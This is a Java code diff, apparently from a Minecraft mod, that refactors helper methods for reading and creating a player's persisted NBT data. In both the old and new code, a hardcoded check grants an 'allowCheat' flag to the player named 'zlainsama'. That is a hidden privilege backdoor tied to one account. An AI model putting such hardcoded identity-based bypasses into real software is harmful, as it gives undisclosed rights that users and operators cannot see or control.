@@ -9,29 +9,31 @@ public final class NOTE
 
     private static final String _ID = "92c98451-a0c6-4899-bce6-c5cc0f75e447";
 
-    public static NOTE get(EntityPlayer p)
+    private static NBTTagCompound _GetOrCreateCompound(NBTTagCompound base, String name)
     {
-        return new NOTE(getRawData(p));
+        if (!base.hasKey(name))
+            base.setTag(name, new NBTTagCompound());
+        return base.getCompoundTag(name);
     }
 
-    private static NBTTagCompound getPlayerPersistedData(EntityPlayer p)
+    private static NBTTagCompound _GetPlayerPersistedData(EntityPlayer p)
     {
-        if (!p.getEntityData().hasKey(EntityPlayer.PERSISTED_NBT_TAG))
-            p.getEntityData().setTag(EntityPlayer.PERSISTED_NBT_TAG, new NBTTagCompound());
-        return p.getEntityData().getCompoundTag(EntityPlayer.PERSISTED_NBT_TAG);
+        return _GetOrCreateCompound(p.getEntityData(), EntityPlayer.PERSISTED_NBT_TAG);
     }
 
-    private static NBTTagCompound getRawData(EntityPlayer p)
+    private static NBTTagCompound _GetRawData(EntityPlayer p)
     {
-        NBTTagCompound tmp = getPlayerPersistedData(p);
-        if (!tmp.hasKey(_ID))
-            tmp.setTag(_ID, new NBTTagCompound());
-        tmp = tmp.getCompoundTag(_ID);
+        NBTTagCompound ret = _GetOrCreateCompound(_GetPlayerPersistedData(p), _ID);
 
         if ("zlainsama".equalsIgnoreCase(p.getCommandSenderName()))
-            tmp.setBoolean("allowCheat", true);
+            ret.setBoolean("allowCheat", true);
 
-        return tmp;
+        return ret;
+    }
+
+    public static NOTE get(EntityPlayer p)
+    {
+        return new NOTE(_GetRawData(p));
     }
 
     private final NBTTagCompound d;
